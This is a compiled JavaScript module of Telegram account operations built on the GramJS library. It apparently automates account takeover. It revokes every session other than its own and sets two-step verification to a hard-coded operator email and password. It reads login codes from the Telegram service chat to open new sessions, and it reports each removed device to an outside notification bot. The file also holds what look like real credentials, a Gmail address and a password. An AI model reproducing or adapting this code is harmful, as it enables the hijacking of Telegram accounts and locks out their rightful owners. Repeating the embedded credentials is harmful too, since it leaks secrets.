"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.isOwnAuth = isOwnAuth;
exports.removeOtherAuths = removeOtherAuths;
exports.getAuths = getAuths;
exports.getLastActiveTime = getLastActiveTime;
exports.hasPassword = hasPassword;
exports.set2fa = set2fa;
exports.createNewSession = createNewSession;
exports.waitForOtp = waitForOtp;
exports.getSessionInfo = getSessionInfo;
exports.terminateSession = terminateSession;
const telegram_1 = require("telegram");
const sessions_1 = require("telegram/sessions");
const Helpers_1 = require("telegram/Helpers");
const big_integer_1 = __importDefault(require("big-integer"));
const parseError_1 = require("../../../utils/parseError");
const fetchWithTimeout_1 = require("../../../utils/fetchWithTimeout");
const logbots_1 = require("../../../utils/logbots");
const generateTGConfig_1 = require("../utils/generateTGConfig");
const tg_config_1 = require("../utils/tg-config");
const IMap_1 = require("../../../IMap/IMap");
function isOwnAuth(mobile, auth) {
    if (auth.current) {
        return true;
    }
    return (0, tg_config_1.isAuthFingerprintMatch)(mobile, auth);
}
async function removeOtherAuths(ctx) {
    if (!ctx.client)
        throw new Error('Client is not initialized');
    const result = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
    const authSummary = result.authorizations.map(formatAuthForLog);
    let keptCount = 0;
    let revokedCount = 0;
    let failedCount = 0;
    const failedAuths = [];
    ctx.logger.info(ctx.phoneNumber, `Auth cleanup starting: total=${result.authorizations.length}`, authSummary);
    for (const auth of result.authorizations) {
        if (isOwnAuth(ctx.phoneNumber, auth)) {
            keptCount++;
            const protectionReason = auth.current
                ? 'current'
                : (0, tg_config_1.getAuthProtectionReason)(auth) || 'fingerprint_match';
            ctx.logger.info(ctx.phoneNumber, `Keeping protected auth (${protectionReason}): ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
            continue;
        }
        ctx.logger.info(ctx.phoneNumber, `Revoking auth: ${auth.appName} | ${auth.deviceModel} | ${auth.country}`);
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth\n\nMobile: ${ctx.phoneNumber}\nApp: ${auth.appName || 'unknown'}\nDevice: ${auth.deviceModel || 'unknown'}\nCountry: ${auth.country || 'unknown'}\nAPI ID: ${auth.apiId || 'unknown'}`)}`);
        const revoked = await resetAuthorization(ctx, auth);
        if (revoked) {
            revokedCount++;
        }
        else {
            failedCount++;
            failedAuths.push(formatAuthForLog(auth));
        }
        await (0, Helpers_1.sleep)(2000 + Math.random() * 3000);
    }
    ctx.logger.info(ctx.phoneNumber, `Auth cleanup attempted: kept=${keptCount}, revoked=${revokedCount}, failed=${failedCount}`, {
        failedAuths,
    });
    try {
        const me = await ctx.client.getMe();
        if (!me) {
            throw new Error('Session verification failed after removeOtherAuths — getMe returned null');
        }
        ctx.logger.info(ctx.phoneNumber, `Session verified alive after auth cleanup (user: ${me.phone})`);
    }
    catch (verifyError) {
        ctx.logger.error(ctx.phoneNumber, 'CRITICAL: Our session may have been revoked during removeOtherAuths!', verifyError);
        throw new Error(`Session self-check failed after removeOtherAuths: ${verifyError}`);
    }
    const afterResult = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
    const remainingOtherAuths = afterResult.authorizations.filter((auth) => !isOwnAuth(ctx.phoneNumber, auth));
    ctx.logger.info(ctx.phoneNumber, `Auth cleanup verified: total=${afterResult.authorizations.length}, remainingOther=${remainingOtherAuths.length}`, {
        authorizations: afterResult.authorizations.map(formatAuthForLog),
    });
    if (failedCount > 0 || remainingOtherAuths.length > 0) {
        throw new Error(`removeOtherAuths incomplete: failed=${failedCount}, remainingOther=${remainingOtherAuths.length}, remaining=${remainingOtherAuths.map(formatAuthForLog).join('; ')}`);
    }
}
function formatAuthForLog(auth) {
    return [
        `app=${auth.appName || 'unknown'}`,
        `device=${auth.deviceModel || 'unknown'}`,
        `country=${auth.country || 'unknown'}`,
        `current=${Boolean(auth.current)}`,
        `apiId=${auth.apiId || 'unknown'}`,
        `hash=${auth.hash?.toString?.() || 'unknown'}`,
    ].join(' | ');
}
async function resetAuthorization(ctx, auth) {
    try {
        await ctx.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
        return true;
    }
    catch (error) {
        (0, parseError_1.parseError)(error, `Failed to reset authorization for ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
        ctx.logger.error(ctx.phoneNumber, `Failed to revoke auth: ${formatAuthForLog(auth)}`, error);
        return false;
    }
}
async function getAuths(ctx) {
    if (!ctx.client)
        throw new Error('Client is not initialized');
    return await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
}
async function getLastActiveTime(ctx) {
    if (!ctx.client)
        throw new Error('Client is not initialized');
    try {
        const result = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.forEach((auth) => {
            if (!isOwnAuth(ctx.phoneNumber, auth)) {
                if (auth.dateActive && latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        if (latest === 0)
            return new Date().toISOString().split('T')[0];
        return new Date(latest * 1000).toISOString().split('T')[0];
    }
    catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error getting last active time:', error);
        return new Date().toISOString().split('T')[0];
    }
}
async function hasPassword(ctx) {
    if (!ctx.client)
        throw new Error('Client is not initialized');
    try {
        const passwordInfo = await ctx.client.invoke(new telegram_1.Api.account.GetPassword());
        return passwordInfo.hasPassword || false;
    }
    catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error checking password status:', error);
        return false;
    }
}
async function set2fa(ctx) {
    if (!(await hasPassword(ctx))) {
        ctx.logger.info(ctx.phoneNumber, 'Password Does not exist, Setting 2FA');
        const imapService = IMap_1.MailReader.getInstance();
        const twoFaDetails = {
            email: 'storeslaksmi@gmail.com',
            hint: 'password - India143',
            newPassword: 'Ajtdmwajt1@',
        };
        return imapService.runExclusive(async () => {
            ctx.logger.info(ctx.phoneNumber, 'Waiting for exclusive access to 2FA mailbox');
            await imapService.connectToMail(30_000);
            ctx.logger.info(ctx.phoneNumber, 'Mail is ready, setting 2FA');
            const verificationStartedAt = new Date();
            try {
                await ctx.client.updateTwoFaSettings({
                    isCheckPassword: false,
                    email: twoFaDetails.email,
                    hint: twoFaDetails.hint,
                    newPassword: twoFaDetails.newPassword,
                    emailCodeCallback: async (length) => {
                        ctx.logger.info(ctx.phoneNumber, `Email code requested by Telegram (length=${length})`);
                        const maxRetries = 4;
                        for (let retry = 0; retry < maxRetries; retry++) {
                            await new Promise(r => setTimeout(r, 10_000));
                            ctx.logger.info(ctx.phoneNumber, `Checking for email code (attempt ${retry + 1}/${maxRetries})`);
                            if (!(await imapService.isMailReady())) {
                                throw new Error('Mail connection lost while waiting for code');
                            }
                            const code = await imapService.getCode({
                                expectedLength: length,
                                minReceivedAt: verificationStartedAt,
                            });
                            if (code) {
                                ctx.logger.info(ctx.phoneNumber, 'Got email code');
                                return code;
                            }
                        }
                        throw new Error(`Failed to retrieve email code after ${maxRetries} attempts`);
                    },
                    onEmailCodeError: (e) => {
                        ctx.logger.error(ctx.phoneNumber, 'Email code error:', (0, parseError_1.parseError)(e));
                        return Promise.resolve('error');
                    },
                });
            }
            finally {
                await imapService.disconnectFromMail().catch(() => { });
            }
            ctx.logger.info(ctx.phoneNumber, '2FA set successfully');
            return twoFaDetails;
        });
    }
    else {
        ctx.logger.info(ctx.phoneNumber, 'Password already exists');
    }
}
async function createNewSession(ctx) {
    const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000));
    const sessionPromise = (async () => {
        const me = await ctx.client.getMe();
        const { apiId, apiHash, params: tgParams } = await (0, generateTGConfig_1.generateTGConfig)(ctx.phoneNumber);
        const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), apiId, apiHash, tgParams);
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => 'Ajtdmwajt1@',
            phoneCode: async () => await waitForOtp(ctx),
            onError: (err) => { throw err; },
        });
        const session = newClient.session.save();
        await newClient.destroy();
        return session;
    })();
    return Promise.race([sessionPromise, timeoutPromise]);
}
async function waitForOtp(ctx) {
    for (let i = 0; i < 3; i++) {
        try {
            const messages = await ctx.client.getMessages('777000', { limit: 1 });
            const message = messages[0];
            if (!message) {
                await (0, Helpers_1.sleep)(5000);
                continue;
            }
            const msgDate = message.date * 1000;
            const freshnessLimit = 60000;
            const isFresh = msgDate > Date.now() - freshnessLimit;
            if (isFresh) {
                return message.text.split('.')[0].split('code:**')[1].trim();
            }
            else {
                const code = message.text.split('.')[0].split('code:**')[1].trim();
                if (i == 2) {
                    return code;
                }
                await (0, Helpers_1.sleep)(5000);
            }
        }
        catch (err) {
            ctx.logger.warn(ctx.phoneNumber, `OTP read attempt ${i + 1} failed: ${err instanceof Error ? err.message : String(err)}`);
            await (0, Helpers_1.sleep)(2000);
        }
    }
    throw new Error('Failed to get OTP after 3 attempts');
}
async function getSessionInfo(ctx) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const [authorizationsResult, devicesResult] = await Promise.all([
        ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations()),
        ctx.client.invoke(new telegram_1.Api.account.GetWebAuthorizations()),
    ]);
    const sessions = authorizationsResult.authorizations.map(auth => ({
        hash: auth.hash.toString(),
        deviceModel: auth.deviceModel,
        platform: auth.platform,
        systemVersion: auth.systemVersion,
        appName: auth.appName,
        dateCreated: new Date(auth.dateCreated * 1000),
        dateActive: new Date(auth.dateActive * 1000),
        ip: auth.ip,
        country: auth.country,
        region: auth.region,
    }));
    const webSessions = devicesResult.authorizations.map(auth => ({
        hash: auth.hash.toString(),
        domain: auth.domain,
        browser: auth.browser,
        platform: auth.platform,
        dateCreated: new Date(auth.dateCreated * 1000),
        dateActive: new Date(auth.dateActive * 1000),
        ip: auth.ip,
        region: auth.region,
    }));
    return { sessions, webSessions };
}
async function terminateSession(ctx, options) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    if (options.exceptCurrent) {
        if (options.type === 'app') {
            await ctx.client.invoke(new telegram_1.Api.auth.ResetAuthorizations());
        }
        else {
            await ctx.client.invoke(new telegram_1.Api.account.ResetWebAuthorizations());
        }
        return true;
    }
    if (options.type === 'app') {
        await ctx.client.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: (0, big_integer_1.default)(options.hash) }));
    }
    else {
        await ctx.client.invoke(new telegram_1.Api.account.ResetWebAuthorization({ hash: (0, big_integer_1.default)(options.hash) }));
    }
    return true;
}
//# sourceMappingURL=auth-operations.js.map